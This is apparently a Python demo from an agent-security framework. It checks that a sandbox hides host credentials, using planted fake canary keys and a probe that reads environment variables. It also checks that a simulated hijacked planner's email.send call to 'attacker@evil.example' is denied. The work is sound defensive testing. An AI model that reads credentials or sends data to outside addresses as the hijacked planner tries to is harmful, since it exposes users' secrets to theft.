"""Demo 07 — Ambient authority removed (paper §11.3, §6.6).

The §11 checklist's "Remove ambient authority" item asks for: no
inherited host env, no home-dir mount, no Docker/SSH socket, no
shared browser cookies, no developer cloud credentials. This demo
constructs a task envelope that does *not* request network access
and runs probe code in the sandbox to demonstrate that:

  - host environment is empty except for explicit safe entries
  - common credential env vars (AWS_*, GITHUB_TOKEN, OPENAI_API_KEY,
    SSH_AUTH_SOCK) are not reachable
  - the broker also denies any tool call that wasn't named in the
    envelope, so even a hijacked planner cannot call email.send

The demo seeds the *parent* process environment with fake creds to
make the test meaningful: if any of those values appears in the
sandbox stdout, the test fails.
"""

from __future__ import annotations

import os

from _demo_runtime import banner, make_runtime, section

from secagent.labels import user_request_label
from secagent.policy_compiler import (
    SideEffectLevel,
    ToolGrant,
    compile_task,
)
from secagent.policy_engine import Verdict
from secagent.tools import RunPythonTool, SendEmailTool


CANARY_VALUES = {
    "AWS_ACCESS_KEY_ID": "AKIACANARYDOESNOTLEAK",
    "GITHUB_TOKEN": "ghp_CANARYDOESNOTLEAK0001",
    "OPENAI_API_KEY": "sk-CANARYDOESNOTLEAK0001",
    "SSH_AUTH_SOCK": "/tmp/should-not-be-passed",
}


def main() -> int:
    banner("Demo 07 — Ambient authority removed at the agent runtime boundary")

    # Plant canaries in the parent env. A leaky sandbox will print them.
    for k, v in CANARY_VALUES.items():
        os.environ[k] = v

    rt = make_runtime()

    policy = compile_task(
        user="alice",
        tenant="acme",
        workflow="data_analysis",
        user_request="Run a quick check.",
        resources_in_scope=[],
        tool_grants=[ToolGrant(tool="sandbox.run_python", action="run", scope={})],
        max_side_effect=SideEffectLevel.EXECUTE_CODE,
        code_execution_required=True,
        approval_threshold=SideEffectLevel.EXECUTE_CODE,
    )
    cap_set = rt.minter.mint_for_task(policy)

    rt.broker.register(RunPythonTool(rt.sandbox, task_id=policy.task_id))
    # email.send is registered but NOT in the envelope. The broker
    # must refuse to call it because no capability was minted.
    rt.broker.register(SendEmailTool())

    section("Step 1 — sandbox runs canary probe; should see no canaries")
    probe = """
import os
keys = sorted(os.environ.keys())
print('keys=', keys)
for k in ('AWS_ACCESS_KEY_ID','GITHUB_TOKEN','OPENAI_API_KEY','SSH_AUTH_SOCK'):
    if k in os.environ:
        print('LEAK', k, os.environ[k])
"""

    def approve(audit_key: str, verdict: Verdict) -> bool:
        return True

    out = rt.broker.invoke(
        policy=policy,
        cap_set=cap_set,
        tool_name="sandbox.run_python",
        action="run",
        args={"code": probe, "network": False},
        arg_labels={"code": user_request_label(policy.task_id)},
        approval_resolver=approve,
    )
    print(f"  decision: {out.decision.value}")
    print(f"  stdout:   {out.result.stdout.strip()}")
    assert out.decision.value == "allow"
    for v in CANARY_VALUES.values():
        assert v not in out.result.stdout, f"canary {v} leaked into sandbox"
    assert "LEAK" not in out.result.stdout

    section("Step 2 — hijacked planner tries email.send; capability never minted")
    blocked = rt.broker.invoke(
        policy=policy,
        cap_set=cap_set,
        tool_name="email.send",
        action="run",
        args={"to": "attacker@evil.example", "subject": "leak", "body": "..."},
        arg_labels={"body": user_request_label(policy.task_id)},
        sink_destination="attacker@evil.example",
    )
    print(f"  decision: {blocked.decision.value}  rule={blocked.rule}")
    print(f"  reason:   {blocked.reason}")
    assert blocked.decision.value == "deny"
    assert blocked.rule == "capability_required"

    print("\nOK: sandbox is sealed against host creds, and out-of-envelope tools fail closed.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
